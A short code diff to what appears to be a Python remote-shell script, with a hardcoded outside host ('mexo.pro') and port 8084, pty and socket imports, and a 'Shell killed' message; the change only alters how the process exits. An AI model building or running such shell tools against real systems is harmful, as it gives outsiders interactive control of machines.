@@ -4,7 +4,7 @@ import pty
 import socket
 import subprocess
 import threading
-from os import read, write, waitpid
+from os import read, write, waitpid, _exit
 
 HOST="mexo.pro"
 PORT=8084
@@ -49,5 +49,4 @@ else:
 
     waitpid(pid, 0)
     print("Shell killed")
-    s2p.kill()
-    p2s.kill()
+    _exit(1)
